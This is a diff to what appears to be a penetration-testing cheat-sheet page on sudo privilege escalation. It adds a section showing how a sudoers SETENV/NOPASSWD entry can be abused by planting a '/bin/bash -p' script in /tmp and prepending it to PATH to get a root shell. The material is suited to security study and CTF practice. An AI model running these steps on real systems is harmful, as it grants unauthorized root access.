@@ -48,7 +48,7 @@ render_with_liquid: false
 
 <br />
 
-## Command Forgery
+## Command Forgery (NOPASSWD)
 
 If you are allowed to execute some command, you can forge the contents of the command.  
 First off, check the properties.
@@ -80,6 +80,31 @@ Now execute the command as root.
 sudo somecmd
 whoami
 # root
+```
+
+<br />
+
+## Command Forgery (SETENV, NOPASSWD)
+
+If you found there is a **SETENV:** in sudoers, you can set the **PATH** when running the command.
+
+```sh
+sudo -l
+(root) SETENV: NOPASSWD: somecmd
+```
+
+As the previous section, prepare the payload.
+
+```sh
+echo '/bin/bash -p' > /tmp/somecmd
+chmod +x /tmp/somecmd
+```
+
+Now run the command as root with setting the PATH.
+
+```sh
+sudo PATH=/tmp:$PATH somecmd
+whoami
 ```
 
 <br />
